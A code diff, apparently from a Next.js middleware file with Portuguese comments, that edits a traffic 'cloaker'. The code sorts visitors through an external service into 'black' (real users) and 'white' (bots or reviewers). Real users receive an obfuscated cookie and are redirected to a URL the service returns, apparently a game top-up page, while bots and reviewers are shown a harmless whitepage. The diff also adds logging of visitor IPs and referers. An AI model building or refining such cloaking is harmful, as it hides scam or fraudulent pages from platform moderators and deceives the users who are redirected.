@@ -24,8 +24,24 @@ export async function middleware(request: NextRequest) {
                         pathname.includes('.svg') ||
                         pathname.includes('.woff')
   
+  // 📊 LOG ORGANIZADO: Acesso do usuário
   if (!isStaticAsset) {
-    console.log(`🌐 [Middleware] Pathname: ${pathname}`)
+    const clientIp = request.headers.get('cf-connecting-ip') || 
+                     request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 
+                     request.headers.get('x-real-ip') || 
+                     'unknown'
+    const referer = request.headers.get('referer') || 'direto'
+    const hasValidCookie = request.cookies.get('_x9f2w8k5')?.value === 'true'
+    
+    console.log('')
+    console.log('┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
+    console.log('┃ 🌐 ACESSO DO USUÁRIO                    ┃')
+    console.log('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
+    console.log(`📍 Rota: ${pathname}`)
+    console.log(`🔑 IP: ${clientIp}`)
+    console.log(`🔗 Referer: ${referer}`)
+    console.log(`🍪 Cookie válido: ${hasValidCookie ? 'SIM' : 'NÃO'}`)
+    console.log('')
   }
   
   // ============================================
@@ -124,7 +140,8 @@ export async function middleware(request: NextRequest) {
     'localhost:3001',
     'localhost:3002',
     'localhost:3003',
-    'localhost:3004'
+    'localhost:3004',
+    'localhost:3051'  // ✅ Porta 3051
   ]
   
   // Bloquear se não for um domínio autorizado (acesso por IP)
@@ -195,7 +212,9 @@ export async function middleware(request: NextRequest) {
   // Apenas na rota raiz (/) e se cloaker estiver ativado e configurado
   // Se chegou aqui, o usuário NÃO tem cookie (já verificamos acima)
   // DESABILITAR em localhost para desenvolvimento
-  if (pathname === '/' && CLOAKER_CONFIG.enabled && CLOAKER_CONFIG.url && !isLocalhost) {
+  const shouldUseCloaker = pathname === '/' && CLOAKER_CONFIG.enabled && CLOAKER_CONFIG.url && !isLocalhost
+  
+  if (shouldUseCloaker) {
     // Verificar referer ANTES de chamar o cloaker
     const referer = request.headers.get('referer') || ''
     
@@ -259,28 +278,37 @@ export async function middleware(request: NextRequest) {
           console.log('📥 [Cloaker] JSON parseado:', JSON.stringify(result, null, 2))
           console.log('🎯 [Cloaker] Tipo detectado:', result.type)
           
-          // Se for "black" (usuário real), setar cookie e redirecionar
+          // Se for "black" (usuário real), apenas setar cookie
+          // O cloaker já retorna a URL de redirect no result.url
           if (result.type === 'black') {
-            const redirectUrl = new URL('/recargajogo', request.url)
-            console.log('✅ [Cloaker] USUÁRIO REAL - setando cookie')
-            console.log('🔄 [Cloaker] Request URL original:', request.url)
-            console.log('🔄 [Cloaker] Redirect URL:', redirectUrl.toString())
-            console.log('🔄 [Cloaker] Pathname:', pathname)
+            console.log('')
+            console.log('┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
+            console.log('┃ ✅ CLOAKER: USUÁRIO REAL (BLACK)        ┃')
+            console.log('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
+            console.log('🔄 URL do cloaker:', result.url || 'N/A')
+            console.log('🍪 Cookie setado: _x9f2w8k5=true')
+            console.log('')
             
-            const response = NextResponse.redirect(redirectUrl)
+            // Usar a URL que o cloaker retornou
+            const redirectUrl = result.url || '/recargajogo'
+            
+            const response = NextResponse.redirect(new URL(redirectUrl, request.url))
             response.cookies.set('_x9f2w8k5', 'true', {
-              httpOnly: false, // Permitir leitura no client-side
+              httpOnly: false,
               secure: true,
               sameSite: 'lax',
               maxAge: 60 * 60 * 24 // 24 horas
             })
             
-            console.log('🍪 [Cloaker] Cookie setado no response')
-            console.log('🔄 [Cloaker] Retornando redirect response')
-            
             return response
           } else {
-            console.log('🤖 [Cloaker] BOT/WHITE detectado - tipo:', result.type)
+            console.log('')
+            console.log('┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
+            console.log('┃ 🤖 CLOAKER: BOT/WHITE DETECTADO        ┃')
+            console.log('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
+            console.log('📍 Tipo:', result.type)
+            console.log('📄 Mostrando: Whitepage (página inicial)')
+            console.log('')
           }
         } catch (parseError) {
           console.error('❌ [Cloaker] Erro ao parsear JSON:', parseError)
